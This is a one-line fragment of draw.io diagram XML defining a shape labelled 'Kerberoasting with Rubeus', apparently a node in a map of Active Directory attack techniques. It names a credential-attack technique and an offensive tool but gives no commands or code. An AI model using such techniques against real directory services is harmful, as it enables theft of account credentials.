        <mxCell id="zsb6fFKO1eEHvJ3RfYXY-89" value="&lt;div&gt;Kerberoasting with Rubeus&lt;/div&gt;" style="whiteSpace=wrap;html=1;rounded=0;fillColor=#dae8fc;strokeColor=#6c8ebf;" parent="1" vertex="1">
